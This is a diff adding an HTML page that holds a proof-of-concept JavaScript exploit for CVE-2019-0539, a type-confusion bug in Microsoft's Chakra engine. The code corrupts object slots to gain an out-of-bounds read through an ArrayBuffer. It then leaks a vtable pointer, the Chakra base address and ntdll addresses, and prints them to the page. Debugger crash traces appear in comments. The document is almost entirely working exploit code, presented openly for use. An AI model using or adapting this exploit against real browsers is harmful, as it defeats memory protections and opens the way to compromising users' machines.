@@ -1,0 +1,184 @@
+<html>
+<script>
+
+/*
+# Exploit Title: [getting Read permission through Type Confusion]
+# Date: [date]
+# Exploit Author: [Fahad Aid Alharbi]
+# Vendor Homepage: [https://www.microsoft.com/en-us/]
+# Version: [Chakra 1_11_4] (REQUIRED)
+# Tested on: [Windows 10]
+# CVE : [cve-2019-0539]
+*/
+/* author @0x4142 => Fahad Aid Alharbi 
+ * cve-2019-0539
+ * Getting Read &_^
+ * date 27 Feb , 2019 
+
+*/
+
+var convert = new ArrayBuffer(0x100);
+var u32 = new Uint32Array(convert);
+var f64 = new Float64Array(convert);
+
+var BASE = 0x100000000;
+
+function hex(x) {
+    return `0x${x.toString(16)}`
+}
+
+function bytes_to_u64(bytes) {
+    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
+                +bytes[4]*0x100000000+bytes[5]*0x10000000000);
+}
+
+function i2f(x) {
+    u32[0] = x % BASE;
+
+    u32[1] = (x - (x % BASE)) / BASE;
+
+
+
+    return f64[0];
+}
+
+
+function f2i(x) {
+    f64[0] = x;
+    return u32[0] + BASE * u32[1];
+}
+
+
+obj = {}
+obj.a = 0x41;
+obj.b = 0x42;
+obj.c = 0x41;
+obj.d = 0x42;
+obj.e = 0x40;
+obj.f = 0x40;
+obj.g = 0x90;
+obj.h = 0x90; 
+obj.i = 0x90;
+
+t = new ArrayBuffer(0x200);
+newL = 0x1000;
+
+hax = new ArrayBuffer(0x2000);
+read_me = 0;
+
+
+function hit_to_read(t){
+
+    obj.h = hax; // set ta->buffer to hax
+    obj.i = newL; // update target's length
+    read_me = new Float64Array(t);
+
+    return read_me;
+
+}
+
+  function read(r,read_me)
+    {
+
+
+
+        read_me[7] = i2f(r); // setup hax->buffer
+        //hax = new ArrayBuffer(0x1000);
+        return  hex(f2i(read_me[7])) 
+  
+    }
+
+
+
+function cout(f){return document.write(f);}
+function opt(o, c, value) {
+   o.c = 1
+   //o.a = "HELLO"
+  // o.b = 3;
+    //o.e = 1
+    class A extends c {
+
+    }
+
+    o.a = value // will overwrite rcx , rdx , rax
+    //o.b = value => chakra!Js::RecyclableObject::HasOnlyWritableDataProperties+0xe:
+    //o.b = 0x42424242
+    o.c = 555555
+   // o.d = 4
+
+}
+
+
+function pwn() {
+
+    for (let i = 0; i < 0x1000; i++) {
+        let o = {a: 1, b: 2,c:3};
+        opt(o, (function () {}), {});
+    }
+
+    let o = {a: 2222, b: 2,c:4,d:5};
+    let cons = function () {};
+
+    cons.prototype = o;
+    /* line 120 
+                        auxSlots *p 
+    __Vfptr | type | 0x00000001234     | 0x0
+    */
+
+    opt(o, cons, obj);
+
+
+    o.f = t
+
+    read_me = hit_to_read(t);
+
+    cout("[+] vtable pointer is " + hex(f2i(read_me[0])));
+    vtable = hex(f2i(read_me[0]));
+
+    buffer_addr = f2i(read_me[7]);
+
+    Chakrabase = hex(vtable  - 0x59a3c0)
+
+   cout("<br>")
+   cout("[+] ChakraBase : " + Chakrabase)
+
+
+    cout("<br>buffer_addr: " + read(buffer_addr + 40 , read_me))
+
+    ThreadContext = read(Chakrabase - 0xffec5448,read_me)
+    Ntdll = read(Chakrabase - 0xdd9a0000,read_me)
+    cout("<br>")
+    cout("[+] ThreadContext : " + ThreadContext)
+    cout("<br>")
+    cout("[+] Ntdl : " + Ntdll)
+    
+    
+}
+
+pwn();
+
+
+/*
+
+s=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+chakra!Js::SimpleDictionaryTypeHandlerBase<unsigned short,Js::PropertyRecord const * __ptr64,0>::GetPropertyFromDescriptor<0>+0x59:
+00007ffc`d61f4109 4c8b14c8        mov     r10,qword ptr [rax+rcx*8] ds:00010000`41414141=????????????????
+
+
+
+
+
+*/
+
+/*
+
+s=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+chakra!Js::SimpleDictionaryTypeHandlerBase<unsigned short,Js::PropertyRecord const * __ptr64,0>::GetPropertyFromDescriptor<0>+0x59:
+00007ffc`d61f4109 4c8b14c8        mov     r10,qword ptr [rax+rcx*8] ds:00010000`41414141=????????????????
+
+
+
+
+
+*/
+</script></html>
